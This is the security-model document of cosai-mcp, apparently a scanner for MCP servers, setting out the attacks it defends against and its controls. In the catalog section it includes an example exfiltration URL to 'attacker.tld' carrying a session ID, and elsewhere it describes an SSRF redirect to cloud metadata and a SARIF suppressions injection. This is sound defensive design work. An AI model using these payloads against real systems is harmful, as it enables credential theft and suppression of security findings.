# cosai-mcp — Security Model

This document describes the security controls applied to the scanner itself. The scanner is a high-value target: it runs in CI with broad permissions, handles attacker-controlled content, and its output feeds into security decision systems. Every control here was specified in response to a concrete attack scenario identified in the architecture adversary panel.

---

## Threat Model: The Scanner as Target

The primary attacker model is an operator of a malicious MCP server who knows the victim is running cosai-mcp against them. Their goal is one or more of:

1. **Invert the result** — make the scanner report clean when findings exist
2. **Exfiltrate** — use the scanner as an SSRF pivot or extract session tokens
3. **Execute code** — escape the scanner process and run attacker code in CI
4. **Poison the report** — inject content into SARIF that suppresses real findings in GitHub
5. **Compromise the catalog** — replace threat definitions with attacker-controlled ones

Each section below addresses one attack surface.

---

## 1. Probe Isolation (prevents cross-probe contamination and CI compromise)

**Attack:** Malicious server response exploits Python module-level state, SSL session cache, or httpx connection pool to contaminate a subsequent probe's execution context.

**Control:** Each probe runs in a separate `multiprocessing.Process`. OS process boundaries eliminate all shared Python state. Results return as JSON-serialized frozen dataclasses — no shared memory, no IPC beyond the serialized result.

**Timeout enforcement:** OS-level (`multiprocessing.Process.terminate` + `SIGKILL`), not Python `threading.Timer`. A GIL-holding operation in the probe cannot block the harness.

**Crash semantics:** Any unexpected process exit (exception, OOM, segfault, SIGKILL from OS) maps to `ProbeStatus.ERROR` — fail-closed. The harness never infers `PASS` from an unexpected process state.

---

## 2. Network Allowlist (prevents SSRF and cloud metadata exfiltration)

**Attack:** Malicious server returns `HTTP 307` to `169.254.169.254` (AWS IMDS) or an internal Vault instance. In CI, this yields OIDC tokens or cloud credentials.

**Controls — enforced at socket connect time via custom httpx transport:**

- `follow_redirects=False` — hard-coded, not configurable
- `trust_env=False` — HTTP_PROXY / HTTPS_PROXY env vars ignored
- Target hostname resolved to IP once at scan start; subsequent connects to a different IP are rejected (defeats DNS rebinding)
- RFC1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) — rejected by default
- Link-local (`169.254.0.0/16`, `fe80::/10`) — rejected by default
- Loopback (`127.0.0.0/8`, `::1`) — rejected by default (scanner connects to an explicit target URL; loopback probing requires explicit `--allow-loopback`)
- IPv6 ULA (`fc00::/7`) — rejected by default

**Hard guarantee:** DNS rebinding resistance requires Docker (`--network=none` + explicit IP rule). The Python-only path provides best-effort protection via IP pinning — documented explicitly; not claimed as a hard guarantee.

---

## 3. SARIF Injection Prevention (prevents GitHub Security tab manipulation)

**Attack:** Malicious MCP response embeds SARIF structural content (e.g., `"suppressions": [{"kind": "inSource"}]`) in an error message. If the scanner naively includes response content in SARIF via string interpolation, the attacker's `suppressions` array is interpreted by GitHub, suppressing unrelated real findings repo-wide.

**Controls:**

- SARIF generated exclusively via structured builder — zero string interpolation
- Attacker-controlled bytes appear in exactly one field: `result.message.text`
  - Content type: plain text only
  - Length cap: 4096 characters
  - Control characters stripped
- `ruleId`, `suppressions`, `partialFingerprints`, `partialFingerprints` — scanner-generated from catalog metadata only, never derived from response content
- SARIF output validated against SARIF 2.1.0 JSON schema before writing to disk
- Partial scans set `invocation.executionSuccessful: false` — prevents a partial clean result from being interpreted as a complete clean scan

---

## 4. stdio Transport Hardening (prevents CI code execution)

**Attack:** If subprocess arguments flow from catalog templates or CLI flags into `subprocess.Popen(shell=True)`, a crafted `{{tool_name}}` value achieves command injection on the developer's machine or CI runner. Child process inherits scanner env including `GITHUB_TOKEN`, `AWS_ACCESS_KEY_ID`, `COSAI_PUBKEY`.

**Controls:**

- `shell=False` — always; never overridable
- `close_fds=True` — child does not inherit scanner file descriptors (audit log, keys)
- `env=` — explicitly constructed minimal allowlist (`PATH`, `COSAI_*` only); no `*_TOKEN`, `*_KEY`, cloud credentials
- `start_new_session=True` — child cannot send signals to scanner process group
- Argv is a fixed list — template substitution never touches argv or env
- stdout/stderr size-capped at 10MB — malicious server cannot OOM scanner via stderr flood
- Line length capped, control characters stripped from stdio output — prevents terminal escape injection into CI logs

**stdio mode default:** disabled in CI mode (`--ci` flag). Requires explicit `--allow-stdio` flag.

---

## 5. Threat Catalog Security (prevents catalog poisoning)

**Attack surface:** JSON files control probe payloads and assertions. A compromised or malicious catalog file could: execute code during evaluation, exfiltrate session tokens by controlling probe target URLs, cause ReDoS via adversarial regex patterns, or claim official provenance while being attacker-controlled.

### 5a. Code execution prevention

- No code execution in JSON — only safe string template substitution
- Template variables: fixed allowlist (`{{target_url}}`, `{{session_id}}`, `{{tool_name}}`)
- Substitution operates on the parsed Python dict, not the serialized JSON string (prevents JSON structural injection)
- Post-substitution `{{` detection — any value that still contains `{{` after expansion aborts the probe with `TemplateInjectionError`
- `operator` field is a closed enum — no arbitrary expression evaluation

### 5b. ReDoS prevention

- All `matches_regex` patterns compiled via `google-re2` (linear-time, no backtracking) at catalog load time
- RE2 refusal to compile a pattern → `UnsafePatternError`; catalog file rejected
- `matches_regex` disabled in custom catalog files unless `--allow-regex-in-custom` is explicitly set

### 5c. Probe destination control

- Probe destination (target host) comes exclusively from CLI scanner config
- Catalog JSON cannot specify an arbitrary URL target — prevents `"url": "https://attacker.tld/{{session_id}}"` exfiltration

### 5d. Provenance integrity

- Provenance (`official` vs `custom`) derived from filesystem load path, never from a JSON field
- A custom directory file claiming `"provenance": "official"` in its content is ignored — provenance is the directory it was loaded from

### 5e. Ed25519 signature verification

- Official catalog files are signed with the project Ed25519 keypair
- Public key hardcoded as bytes literal in `cosai_mcp/keys.py` — not loaded from disk, not configurable at runtime (only `COSAI_PUBKEY` env var override for enterprise key rotation)
- Key also published via Sigstore/Rekor and DNS TXT record — verifier requires ≥2 sources
- Unsigned official files: rejected, not warned about
- `COSAI_PUBKEY` env override is logged explicitly in scan output

### 5f. Schema validation

- Every JSON file validated against strict JSON Schema meta-schema before load
- Unknown fields rejected (not ignored) — prevents schema evolution attacks where new field types are added by an attacker before the scanner handles them
- Custom catalog: requires `--allow-custom-catalog` flag (off by default); documented as third-party code

### 5g. Immutable definitions

- Threat definitions converted to frozen dataclasses at load time
- All container fields converted to `tuple` and `MappingProxyType` — `list.append()` on any definition field raises `AttributeError`
- A post-load integrity walk asserts no mutable containers in the definition tree

---

## 6. Report Signing (prevents retroactive tampering)

**Attack:** A finding is discovered, the scanner report is tampered to remove it, and the tampered report is submitted as audit evidence.

**Controls:**

- Reports signed with a per-installation Ed25519 key stored in the OS keychain (`keyring` library)
- Signature covers: scan timestamp + catalog hash + report content hash
- Public key fingerprint embedded in the report — verifier uses only the fingerprint; private key not needed for verification
- `cosai audit verify <report>` checks signature integrity
- Two key types used: (1) catalog verification key (hardcoded public, never per-installation) and (2) report signing key (per-installation, OS keychain) — these are different keys

---

## 7. Audit Log Integrity (T12 self-protection)

**Attack:** An attacker with write access to the audit log directory truncates or overwrites entries to hide scanner activity.

**Control:** Hash-chained log:

```json
{"seq": 1, "data": {...}, "prev_hash": "sha256:0000...0000", "entry_hash": "sha256:..."}
{"seq": 2, "data": {...}, "prev_hash": "sha256:<entry1_hash>", "entry_hash": "sha256:..."}
```

Tampering with entry N breaks the chain at entry N+1. `cosai audit verify` surfaces `CHAIN_BROKEN` at the first invalid sequence number.

Write mechanism: O_APPEND + fsync per entry. File-level immutability (`chattr +a`) is a recommended OS-level supplement, documented as outside the scanner's scope.

---

## 8. Environment Scrubbing (prevents credential exfiltration)

**Attack:** Scanner process inherits `GITHUB_TOKEN`, `AWS_ACCESS_KEY_ID`, or other secrets from CI environment. Config logging, error messages, or child processes leak these.

**Controls:**

- Scanner scrubs environment at process start: strips all vars matching `*_TOKEN`, `*_KEY`, `AWS_*`, `GOOGLE_*`, `GCP_*` before any subprocess launch
- Retained: `PATH`, `COSAI_*`, `HOME`, `TMPDIR`
- GitHub Action sets `permissions: contents: read, security-events: write` only — no `id-token: write`, no `packages: write`

---

## 9. Supply Chain (prevents PyPI takeover and Action tag hijacking)

**Attack 1:** PyPI account compromise. Attacker ships malicious release with attacker-controlled Ed25519 key. Key and catalog in same wheel = self-verifying signatures are theater.

**Attack 2:** GitHub Action `@v1` tag is mutable. Compromised org re-points tag; every CI using the Action runs attacker code with `security-events: write`.

**Controls:**

- Ed25519 public key hardcoded in source — attacker must also compromise source to replace it
- PyPI releases carry Sigstore/PEP 740 attestations — verifiable via `pip install --verify` (Python 3.12+)
- Published examples reference Actions by commit SHA, never by tag
- Reproducible builds — binary content is deterministic from source
- SLSA L3 provenance — build provenance attestation covers source → artifact chain

---

## Reporting a Vulnerability

Security issues in cosai-mcp should be reported privately via GitHub's Security Advisory feature (private disclosure). Do not open public issues for vulnerabilities.

Response SLA: acknowledgement within 48 hours, initial assessment within 7 days.
